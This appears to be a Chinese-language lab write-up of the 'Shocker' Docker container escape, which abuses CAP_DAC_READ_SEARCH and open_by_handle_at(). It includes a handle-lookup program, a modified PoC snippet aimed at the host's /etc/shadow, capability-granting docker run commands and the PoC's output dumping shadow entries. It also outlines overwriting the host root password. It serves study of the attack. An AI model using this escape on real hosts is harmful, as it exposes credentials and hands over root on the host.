# 漏洞描述

**危害：** 容器内不可以访问宿主机文件，包括读写操作，通过修改宿主机 /etc/shadown 文件可以容器逃逸
拥有 cap_dac_override 的容器可以逃逸

**漏洞前提条件：** 具备 CAP_DAC_READ_SEARCH 

# 原理

## 概述

拥有 CAP_DAC_READ_SEARCH 权限的容器可以使用 open_by_handle_at() 系统调用获取根目录文件描述符

```
open_by_handle_at()
    ...
    The caller must have the CAP_DAC_READ_SEARCH capability to invoke
    open_by_handle_at().
```


## 详述

先看一下 Linux 手册 [capabilities(7) — Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html) 对 CAP_DAC_OVERRIDE 和 CAP_DAC_READ_SEARCH 的描述, 如下

```
CAP_DAC_OVERRIDE
   Bypass file read, write, and execute permission checks. 
   (DAC is an abbreviation of "discretionary access control".)

CAP_DAC_READ_SEARCH
   •  Bypass file read permission checks and directory read and execute permission checks;
   •  invoke open_by_handle_at();
   •  use the linkat() AT_EMPTY_PATH flag to create a link to a file referred to by a file descriptor.
```
也就是说  CAP_DAC_READ_SEARCH 或 CAP_DAC_OVERRIDE 都有忽略文件访问权限访问文件的能力
不同的是 CAP_DAC_OVERRIDE 忽略文件的读、写和执行权限检查；CAP_DAC_READ_SEARCH 忽略文件的读权限检查，文件夹的读和执行权限检查，并需要调用 open_by_handle_at()

POC 参考： [Shocker / Docker Breakout PoC](https://github.com/gabrtv/shocker/tree/master)

POC 中定义的 root_h 是根路径 "/" 的文件句柄
```c
struct my_file_handle root_h = {
	.handle_bytes = 8,
	.handle_type = 1,
	.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};
```

我们可以通过 name_to_handle_at 来验证，代码如下

```c
// reference: https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html 
// gcc nametohandleat.c -o nametohandleat

#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    int mount_id, fhsize, flags, dirfd;
    char *pathname;
    struct file_handle *fhp;

    if (argc != 2)
    {
        fprintf(stderr, "Usage: %s pathname\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    pathname = argv[1];

    /* Allocate file_handle structure. */

    fhsize = sizeof(*fhp);
    fhp = malloc(fhsize);
    if (fhp == NULL)
        err(EXIT_FAILURE, "malloc");

    /* Make an initial call to name_to_handle_at() to discover
       the size required for file handle. */

    dirfd = AT_FDCWD; /* For name_to_handle_at() calls */
    flags = 0;        /* For name_to_handle_at() calls */
    fhp->handle_bytes = 0;
    if (name_to_handle_at(dirfd, pathname, fhp,
                          &mount_id, flags) != -1 ||
        errno != EOVERFLOW)
    {
        fprintf(stderr, "Unexpected result from name_to_handle_at()\n");
        exit(EXIT_FAILURE);
    }

    /* Reallocate file_handle structure with correct size. */

    fhsize = sizeof(*fhp) + fhp->handle_bytes;
    fhp = realloc(fhp, fhsize); /* Copies fhp->handle_bytes */
    if (fhp == NULL)
        err(EXIT_FAILURE, "realloc");

    /* Get file handle from pathname supplied on command line. */

    if (name_to_handle_at(dirfd, pathname, fhp, &mount_id, flags) == -1)
        err(EXIT_FAILURE, "name_to_handle_at");

    /* Write mount ID, file handle size, and file handle to stdout,
       for later reuse by t_open_by_handle_at.c. */

    printf("%d\n", mount_id);
    printf("%u %d   ", fhp->handle_bytes, fhp->handle_type);
    for (size_t j = 0; j < fhp->handle_bytes; j++)
        printf(" %02x", fhp->f_handle[j]);
    printf("\n");

    exit(EXIT_SUCCESS);
}
```
编译执行上面的程序可以看到根路径 "/" 的句柄和 POC 定义的一样
```
┌──(kali㉿kali)-[~/containersec]
└─$ ./nametohandleat /   
28
8 1    02 00 00 00 00 00 00 00
```

更改shocker.c中 .dockerinit 文件为 /etc/hosts（这个文件需要和宿主机在同一个挂载的文件系统下，而高版本的.dockerinit已经不在宿主机的文件系统下了），或者其他文件和宿主机同一个目录下的。

```c
	// get a FS reference from something mounted in from outside
	// if ((fd1 = open("/.dockerinit", O_RDONLY)) < 0)  <---- 原来的代码
   if ((fd1 = open("/etc/hosts", O_RDONLY)) < 0)
		die("[-] open");

	if (find_handle(fd1, "/etc/shadow", &root_h, &h) <= 0)
		die("[-] Cannot find valid handle!");
```

为了实现容器与宿主机之间的网络通信，Docker 会在容器启动时自动将宿主机的 /etc/hosts 文件挂载到容器内部。这样，容器内部就能够通过主机名访问到宿主机以及宿主机上的其他网络服务

除了 `/etc/hosts` 文件之外，Docker 还会自动挂载一些其他的文件或目录到容器内部，以实现容器与宿主机之间的一些基本功能和通信。这些文件或目录包括但不限于：

1. **/etc/resolv.conf**：用于 DNS 解析的配置文件。Docker 会将宿主机上的 `/etc/resolv.conf` 文件挂载到容器内部，以便容器能够通过 DNS 解析域名。

2. **/etc/hostname**：宿主机的主机名配置文件。Docker 会将宿主机的主机名文件挂载到容器内部，以便容器能够了解宿主机的主机名。

3. **/etc/localtime 或 /etc/timezone**：宿主机的时区配置文件。Docker 会将宿主机的时区文件挂载到容器内部，以便容器能够使用与宿主机相同的时区设置。

4. **/var/run/docker.sock**：Docker 守护进程的 Unix 套接字。如果容器中需要与 Docker 守护进程进行通信（如使用 Docker CLI 或 Docker API），可以将宿主机上的 Docker 套接字挂载到容器内部。

这些文件或目录的自动挂载可以简化容器与宿主机之间的通信和配置，同时也可以确保容器能够访问到宿主机的基本网络和系统配置。

容器内，用 findmnt 可以看到 /etc/resolv.conf、/etc/hostnane、/etc/host 挂载在 /dev/sda1 

```
// 容器内执行 findmnt
root@3c1201415e7d:~# findmnt
TARGET                  SOURCE                                                                          FSTYPE  OPTIONS
/
| ... 
| ...                      
|-/etc/resolv.conf      /dev/sda1[/var/lib/docker/containers/3c1201415e7dcff29ab1d47c80004c77679bc0a6704978585336e9a8c0c1b6c4/resolv.conf]
|                                                                                                       ext4    rw,relatime,errors=remount-ro
|-/etc/hostname         /dev/sda1[/var/lib/docker/containers/3c1201415e7dcff29ab1d47c80004c77679bc0a6704978585336e9a8c0c1b6c4/hostname]
|                                                                                                       ext4    rw,relatime,errors=remount-ro
`-/etc/hosts            /dev/sda1[/var/lib/docker/containers/3c1201415e7dcff29ab1d47c80004c77679bc0a6704978585336e9a8c0c1b6c4/hosts]
                                                                                                        ext4    rw,relatime,errors=remount-ro

```

后续的代码就是暴力破解文件，获取到 /etc/shadow 的文件句柄和文件描述符，对文件进行操作



# 漏洞复现

使用 ubuntu 容器镜像创建两个容器，两个容器分别具备 CAP_DAC_OVERRIDE 和 CAP_DAC_READ_SEARCH

```
┌──(kali㉿kali)-[~]
└─$ sudo docker run -itd --name ubuntu_1 --cap-add=cap_dac_override --cap-drop=all ubuntu
ee0b268deab89078348096c9877d2f05aff88ae6c1e6529600eb29cc32bebf1b

┌──(kali㉿kali)-[~]
└─$ sudo docker run -itd --name ubuntu_2 --cap-add=cap_dac_read_search --cap-drop=all ubuntu
139d2ffe325670cd204744ef4db254b119c70a8da059339d873828bf7fa0b782

```

拥有 cap_dac_read_search 的容器可以调用 open_by_handle_at 进行逃逸，下面是读取宿主机的 /etc/shadow 文件

```
....
[+] Match: shadow ino=1966251
[*] Brute forcing remaining 32bit. This can take a while...
[*] (shadow) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0xab, 0x00, 0x1e, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0xab, 0x00, 0x1e, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /etc/shadow output follows:
root:*:19778:0:99999:7:::
daemon:*:19778:0:99999:7:::
bin:*:19778:0:99999:7:::
...
```

只拥有 cap_dac_override 的容器不可以调用 open_by_handle_at 进行逃逸
```
// only cap_dac_override in this contaier 
root@ee0b268deab8:/# ./shocker
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]
[*] Resolving 'etc/shadow'
[-] open_by_handle_at: Operation not permitted

```

## 漏洞利用

如果一个容器具备 cap_dac_read_search 可以通过修改宿主机的 /etc/shadow 的 root 用户密码，然后直接 root 登录到宿主机

```
┌──(kali㉿kali)-[~/containersec]
└─$ sudo docker run -itd --name=ubuntu3 --cap-add=cap_dac_read_search --cap-add=cap_dac_override --cap-drop=all ubuntu
```














# 扩展

## CAP_DAC_OVERRIDE 和 CAP_DAC_READ_SEARCH 区别

参考：[Is cap_dac_override a superset of cap_dac_read_search?](https://stackoverflow.com/questions/48329731/is-cap-dac-override-a-superset-of-cap-dac-read-search)